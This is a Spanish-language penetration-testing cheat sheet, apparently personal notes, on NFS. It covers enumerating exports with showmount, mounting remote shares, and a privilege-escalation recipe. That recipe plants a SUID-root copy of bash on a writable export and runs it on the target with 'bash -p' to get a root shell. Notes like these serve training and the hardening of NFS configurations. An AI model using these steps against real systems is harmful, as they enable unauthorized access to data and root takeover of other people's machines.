# NFS

Tags: #NFS #Linux 

Protocolo que permite compartir directorios/archivos en la red entre máquinas Unix/Linux. Un servidor NFS exporta directorios que otros clientes pueden montar localmente como si fueran directorios locales.

# Enumeración 

## Extracción de archivos  
```bash 
# Cuando encontremos estos puertos lo mas probables que es que exista una montura 

❯ showmount --exports <IP>      # Ver si podemos hacer una montura de alguna ruta
	/srv/nfs/user1 *
❯ mkdir nfs                     # Crear dir de la montura en Kali 

# Hacer la montura de la ruta anterior a una de nuestro kali 
❯ mount -t nfs -o nolock <IP>:/srv/nfs/user1 nfs

	# nfs = Tipo de filesystem 
	# nolock = Opcional: No usar lock de archivos (más rápido, menos seguro)
	# nfs = Directorio donde se va a copiar la montura 
	# <IP>:/srv/nfs/user1 = IP más ruta remota del primer comando 'showmount'

❯ umount nfs   # Al finalizar desmontar el directorio 
```

## Escalada con NFS
```bash 
❯ showmount -e <IP>        # Mirar el directorio de montura desde Kali 
❯ mkdir /tmp/nfs           # Crear dir de la montura en Kali 

❯ mount -t nfs <IP>:/home /tmp/nfs      # Montar el directorio de la víctima en el dir '/tmp/nfs' de Kali 
	# IP = Dirección IP del server víctima 
	# /home = Es el directorio que muestra el primer comando 
	# /tmp/nfs = Es el dir creado en Kali 

# Copiar la bash de Kali al dir /tmp y agregarle el SUID  
❯ sudo cp /bin/bash /tmp
❯ sudo chmod +s /tmp/bash 

# Subir la 'bash' de kali ya con el SUID a la montura
❯ sudo cp /tmp/bash /tmp/nfs

# Dentro del server ejecutar la bash con privilegios de root 
❯ ./bash -p   


NOTA: 
	- Los cambios en ese dir montado en Kali se reflejan al momento en la máquina víctima  
```

```bash 
# Una forma de ingresar al server si se tienen cred válidas 
# En la máquina víctima ejecutar la bash con privilegios de root 
❯ ssh ubuntu@IP      # Ingresar con SSH si no se tiene sesión para ejecutar la bash 
❯ ./bash -p         

Paso 6: 
❯ umount /tmp/nfs    # Al finalizar desmontar el directorio   
```
